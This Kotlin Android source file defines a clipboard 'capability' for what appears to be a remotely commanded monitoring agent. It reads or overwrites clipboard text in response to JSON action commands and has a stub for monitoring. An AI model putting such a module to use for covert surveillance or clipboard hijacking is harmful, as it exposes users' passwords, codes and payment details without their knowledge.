package com.system.monitor.capabilities

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import com.google.gson.Gson
import com.system.monitor.AgentService

class ClipboardCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "get" -> getClipboard()
            "set" -> setClipboard(params.text ?: "")
            "monitor" -> mapOf<String, Any>("status" to "monitoring_not_implemented")
            else -> mapOf<String, Any>("error" to "invalid action")
        }
    }

    override fun cleanup() {}

    private fun getClipboard(): Map<String, Any> {
        val clipboard = service.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        if (!clipboard.hasPrimaryClip()) return mapOf<String, Any>("text" to "")
        val clip = clipboard.primaryClip ?: return mapOf<String, Any>("text" to "")
        val text = StringBuilder()
        for (i in 0 until clip.itemCount) {
            clip.getItemAt(i).text?.let { text.append(it) }
        }
        return mapOf<String, Any>("text" to text.toString())
    }

    private fun setClipboard(text: String): Map<String, Any> {
        val clipboard = service.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("clipboard", text)
        clipboard.primaryClip = clip
        return mapOf<String, Any>("status" to "set", "text" to text)
    }

    data class Params(val action: String, val text: String? = null)
}